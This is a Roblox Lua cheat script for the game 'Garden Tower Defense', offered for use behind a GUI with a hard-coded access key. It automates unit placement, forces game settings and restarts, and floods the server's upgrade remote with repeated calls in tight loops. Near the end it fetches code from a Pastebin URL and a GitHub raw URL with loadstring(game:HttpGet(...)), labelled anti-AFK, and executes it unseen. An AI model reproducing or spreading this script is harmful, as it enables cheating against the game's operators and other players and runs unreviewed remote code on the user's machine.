--// Garden Tower Defense Script - SIMPLE UNIT ID TRACKING
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

print(plr.Name .. " loaded the script. Waiting for key...")

--// Improved Key GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = plr:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
Frame.BorderSizePixel = 0
Frame.BackgroundTransparency = 0.1
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(80, 120, 200)
UIStroke.Thickness = 2
UIStroke.Parent = Frame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 60)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "GARDEN TOWER DEFENSE"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 24
Title.TextStrokeTransparency = 0.8
Title.Parent = Frame

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 30)
SubTitle.Position = UDim2.new(0, 0, 0, 40)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "Enter Access Key"
SubTitle.TextColor3 = Color3.fromRGB(200, 200, 220)
SubTitle.Font = Enum.Font.Gotham
SubTitle.TextSize = 16
SubTitle.Parent = Frame

-- Key Input
local TextBoxContainer = Instance.new("Frame")
TextBoxContainer.Size = UDim2.new(1, -40, 0, 50)
TextBoxContainer.Position = UDim2.new(0, 20, 0, 90)
TextBoxContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
TextBoxContainer.BorderSizePixel = 0
TextBoxContainer.Parent = Frame

local TextBoxCorner = Instance.new("UICorner")
TextBoxCorner.CornerRadius = UDim.new(0, 8)
TextBoxCorner.Parent = TextBoxContainer

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1, -20, 1, -10)
TextBox.Position = UDim2.new(0, 10, 0, 5)
TextBox.PlaceholderText = "Enter key here..."
TextBox.Text = ""
TextBox.Font = Enum.Font.Gotham
TextBox.TextSize = 18
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1
TextBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
TextBox.Parent = TextBoxContainer

-- Check Button
local CheckBtn = Instance.new("TextButton")
CheckBtn.Size = UDim2.new(1, -40, 0, 50)
CheckBtn.Position = UDim2.new(0, 20, 0, 160)
CheckBtn.Text = "VERIFY KEY"
CheckBtn.Font = Enum.Font.GothamBold
CheckBtn.TextSize = 18
CheckBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
CheckBtn.BorderSizePixel = 0
CheckBtn.Parent = Frame

local CheckBtnCorner = Instance.new("UICorner")
CheckBtnCorner.CornerRadius = UDim.new(0, 8)
CheckBtnCorner.Parent = CheckBtn

-- Status Label
local Label = Instance.new("TextLabel")
Label.Size = UDim2.new(1, -40, 0, 40)
Label.Position = UDim2.new(0, 20, 0, 220)
Label.BackgroundTransparency = 1
Label.Text = ""
Label.Font = Enum.Font.Gotham
Label.TextSize = 14
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
Label.TextWrapped = true
Label.Parent = Frame

--// Remotes
local rs = game:GetService("ReplicatedStorage")
local remotes = rs:WaitForChild("RemoteFunctions")

-- Auto Skip (enable once at start)
task.delay(2, function()
    pcall(function()
        remotes.ToggleAutoSkip:InvokeServer(true)
        warn("[System] Auto Skip Enabled")
    end)
end)

--=== SIMPLE UNIT ID TRACKING SYSTEM ===--

function loadSimpleIDTracking()
    warn("[System] Loaded SIMPLE UNIT ID TRACKING SYSTEM")
    
    -- Track units by type and their IDs
    local trackedUnits = {
        tomatoes = {},
        metal_flowers = {},
        potatoes = {}
    }
    
    -- Simple upgrade function
    local function upgradeUnit(unitId)
        pcall(function()
            remotes.UpgradeUnit:InvokeServer(unitId)
        end)
    end

    -- Function to track when units are placed
    local function trackUnitPlacement(unitName, unitId)
        warn("[TRACKING] Placed " .. unitName .. " with ID: " .. tostring(unitId))
        
        if unitName == "unit_tomato_rainbow" then
            table.insert(trackedUnits.tomatoes, unitId)
        elseif unitName == "unit_metal_flower" then
            table.insert(trackedUnits.metal_flowers, unitId)
        elseif unitName == "unit_punch_potato" then
            table.insert(trackedUnits.potatoes, unitId)
        end
        
        -- Print current tracked units
        warn(string.format("[TRACKED] Tomatoes: %d, Metal Flowers: %d, Potatoes: %d", 
            #trackedUnits.tomatoes, #trackedUnits.metal_flowers, #trackedUnits.potatoes))
    end

    -- Simple place function that also tracks
    local function placeAndTrackUnit(unitName, data)
        local success, result = pcall(function()
            return remotes.PlaceUnit:InvokeServer(unitName, data)
        end)
        
        if success then
            warn("[Placed] " .. unitName .. " at " .. os.clock())
            
            -- Try to track the unit ID from the result
            if result and type(result) == "number" then
                trackUnitPlacement(unitName, result)
            else
                -- If we can't get the ID, we'll use a fallback method
                -- Assume IDs are sequential and track the count
                local unitType = ""
                if unitName == "unit_tomato_rainbow" then
                    unitType = "tomatoes"
                elseif unitName == "unit_metal_flower" then
                    unitType = "metal_flowers"
                elseif unitName == "unit_punch_potato" then
                    unitType = "potatoes"
                end
                
                -- Use the count as a pseudo-ID (this is a fallback)
                local pseudoId = #trackedUnits[unitType] + 1
                trackUnitPlacement(unitName, pseudoId)
            end
            
            return true
        else
            warn("[Failed] " .. unitName)
            return false
        end
    end

    -- Upgrade functions that use tracked IDs
    local function upgradeTrackedTomatoes()
        warn("[UPGRADE] Upgrading tracked tomatoes: " .. #trackedUnits.tomatoes .. " units")
        while true do
            for _, unitId in ipairs(trackedUnits.tomatoes) do
                upgradeUnit(unitId)
                upgradeUnit(unitId) -- Double call
            end
            task.wait(0.01)
        end
    end

    local function upgradeTrackedMetalFlowers()
        warn("[UPGRADE] Upgrading tracked metal flowers: " .. #trackedUnits.metal_flowers .. " units")
        while true do
            for _, unitId in ipairs(trackedUnits.metal_flowers) do
                upgradeUnit(unitId)
                upgradeUnit(unitId) -- Double call
            end
            task.wait(0.01)
        end
    end

    local function upgradeTrackedPotatoes()
        warn("[UPGRADE] Upgrading tracked potatoes: " .. #trackedUnits.potatoes .. " units")
        while true do
            for _, unitId in ipairs(trackedUnits.potatoes) do
                upgradeUnit(unitId)
                upgradeUnit(unitId) -- Double call
                upgradeUnit(unitId) -- Triple call
            end
            task.wait(0.001) -- Faster for potatoes
        end
    end

    -- Unit placement data
    local unitPlacements = {
        -- Rainbow Tomatoes
        {
            time = 5,
            unit = "unit_tomato_rainbow",
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-850.7767333984375, 61.93030548095703, -155.0453338623047, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-850.7767333984375, 61.93030548095703, -155.0453338623047)
            }
        },
        {
            time = 55,
            unit = "unit_tomato_rainbow", 
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-852.2405395507812, 61.93030548095703, -150.1680450439453, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-852.2405395507812, 61.93030548095703, -150.1680450439453)
            }
        },
        -- Metal Flowers
        {
            time = 85,
            unit = "unit_metal_flower",
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-850.2332153320312, 61.93030548095703, -151.0040740966797, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-850.2332153320312, 61.93030548095703, -151.0040740966797)
            }
        },
        {
            time = 100,
            unit = "unit_metal_flower",
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-853.2742919921875, 61.93030548095703, -146.7690887451172, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-853.2742919921875, 61.93030548095703, -146.7690887451172)
            }
        },
        {
            time = 115,
            unit = "unit_metal_flower",
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-857.4375, 61.93030548095703, -148.3301239013672, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-857.4375, 61.93030548095703, -148.3301239013672)
            }
        },
        -- Punch Potatoes
        {
            time = 185,
            unit = "unit_punch_potato",
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-851.727783203125, 61.93030548095703, -135.6544952392578, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-851.727783203125, 61.93030548095703, -135.6544952392578)
            }
        },
        {
            time = 190,
            unit = "unit_punch_potato",
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-851.33349609375, 61.93030548095703, -133.5747833251953, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-851.33349609375, 61.93030548095703, -133.5747833251953)
            }
        },
        {
            time = 195,
            unit = "unit_punch_potato",
            data = {
                Valid = true,
                Rotation = 180,
                CF = CFrame.new(-846.9492797851562, 61.93030548095703, -133.9480743408203, -1, 0, -8.742277657347586e-08, 0, 1, 0, 8.742277657347586e-08, 0, -1),
                Position = Vector3.new(-846.9492797851562, 61.93030548095703, -133.9480743408203)
            }
        }
    }

    -- Main game loop
    local function mainGameLoop()
        while true do
            warn("[GAME START] New game cycle starting...")
            
            -- Clear tracked units for new game
            trackedUnits = {
                tomatoes = {},
                metal_flowers = {},
                potatoes = {}
            }
            
            -- Set game settings
            remotes.ChangeTickSpeed:InvokeServer(3)
            remotes.PlaceDifficultyVote:InvokeServer("dif_hard")
            
            -- Place all units with tracking
            for _, placement in ipairs(unitPlacements) do
                task.delay(placement.time, function()
                    placeAndTrackUnit(placement.unit, placement.data)
                end)
            end
            
            -- Start upgrades based on timing
            -- Tomatoes start at 6s
            task.delay(6, function()
                warn("[STARTING] Tomato upgrades with tracked IDs")
                upgradeTrackedTomatoes()
            end)
            
            -- Metal flowers start at 86s
            task.delay(86, function()
                warn("[STARTING] Metal flower upgrades with tracked IDs")
                upgradeTrackedMetalFlowers()
            end)
            
            -- Potatoes start at 186s
            task.delay(186, function()
                warn("[STARTING] Potato upgrades with tracked IDs")
                upgradeTrackedPotatoes()
            end)
            
            -- Wait for game duration
            task.wait(300) -- 5 minutes
            
            warn("[RESTART] Restarting game...")
            remotes.RestartGame:InvokeServer()
            
            -- Wait for reset
            task.wait(5)
        end
    end

    -- Start everything
    mainGameLoop()
end

--=== SIMPLIFIED MENU ===--
local function showStrategyMenu()
    Frame.Size = UDim2.new(0, 450, 0, 350)
    Frame.Position = UDim2.new(0.5, -225, 0.5, -175)
    
    Title.Text = "SIMPLE ID TRACKING"
    SubTitle.Text = "Tracks unit placements"
    TextBox.Visible = false
    CheckBtn.Visible = false
    Label.Visible = false

    -- Instructions
    local Instructions = Instance.new("TextLabel")
    Instructions.Size = UDim2.new(1, -40, 0, 120)
    Instructions.Position = UDim2.new(0, 20, 0, 60)
    Instructions.BackgroundTransparency = 1
    Instructions.Text = "🎯 SIMPLE UNIT ID TRACKING\n• Tracks when units are placed\n• Uses placement timing\n• Upgrades only placed units\n• Works across game restarts\n• No complex hooking"
    Instructions.Font = Enum.Font.Gotham
    Instructions.TextSize = 14
    Instructions.TextColor3 = Color3.fromRGB(100, 255, 100)
    Instructions.TextWrapped = true
    Instructions.Parent = Frame

    -- Simple Tracking Button
    local btnSimple = Instance.new("TextButton")
    btnSimple.Size = UDim2.new(1, -40, 0, 120)
    btnSimple.Position = UDim2.new(0, 20, 0, 200)
    btnSimple.Text = "SIMPLE ID TRACKING\nTracks Unit Placements\nNo Complex Hooking"
    btnSimple.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
    btnSimple.TextColor3 = Color3.fromRGB(255, 255, 255)
    btnSimple.Font = Enum.Font.GothamBold
    btnSimple.TextSize = 18
    btnSimple.BorderSizePixel = 0
    btnSimple.Parent = Frame

    local btnSimpleCorner = Instance.new("UICorner")
    btnSimpleCorner.CornerRadius = UDim.new(0, 10)
    btnSimpleCorner.Parent = btnSimple

    btnSimple.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
        loadSimpleIDTracking()
    end)
end

--=== KEY CHECK ===--
CheckBtn.MouseButton1Click:Connect(function()
    if TextBox.Text:upper() == "GTD2025" then
        Label.Text = "✅ Key Verified! Loading SIMPLE TRACKING..."
        Label.TextColor3 = Color3.fromRGB(100, 255, 100)
        CheckBtn.BackgroundColor3 = Color3.fromRGB(80, 180, 80)
        CheckBtn.Text = "SUCCESS!"
        
        task.delay(1.5, showStrategyMenu)
    else
        TextBox.Text = ""
        Label.Text = "❌ Invalid Key! Please try again."
        Label.TextColor3 = Color3.fromRGB(255, 100, 100)
        CheckBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
        
        task.delay(1, function()
            CheckBtn.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
            CheckBtn.Text = "VERIFY KEY"
        end)
    end
end)

-- Add some visual effects
TextBox.Focused:Connect(function()
    TextBoxContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
end)

TextBox.FocusLost:Connect(function()
    TextBoxContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
end)

-- Load anti-afk scripts
loadstring(game:HttpGet("https://pastebin.com/raw/HkAmPckQ"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))()

-- Force GUI to be on top
ScreenGui.DisplayOrder = 999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

print("GUI setup complete - Should be visible now!")
